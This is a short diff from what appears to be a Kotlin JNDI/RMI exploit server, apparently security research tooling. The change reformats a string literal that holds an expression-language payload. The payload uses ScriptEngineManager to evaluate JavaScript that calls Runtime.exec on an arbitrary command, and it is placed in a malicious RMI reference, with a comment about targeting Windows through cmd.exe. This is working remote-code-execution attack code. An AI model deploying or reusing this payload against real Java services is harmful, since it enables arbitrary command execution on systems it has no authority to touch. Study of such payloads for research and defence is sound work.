@@ -177,13 +177,14 @@ class RMIServer {
             //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
             add(
                 StringRefAddr(
-                    "x", """
-                    |"".getClass()
-                    |.forName("javax.script.ScriptEngineManager")
-                    |.newInstance()
-                    |.getEngineByName("JavaScript")
-                    |.eval("java.lang.Runtime.getRuntime().exec('$command')")"""
-                        .trimMargin().replace("\n", "")
+                    "x",
+                    """
+                    "".getClass()
+                    .forName("javax.script.ScriptEngineManager")
+                    .newInstance()
+                    .getEngineByName("JavaScript")
+                    .eval("java.lang.Runtime.getRuntime().exec('$command')")
+                    """.trimIndent().replace("\n", "")
                 )
             )
         }
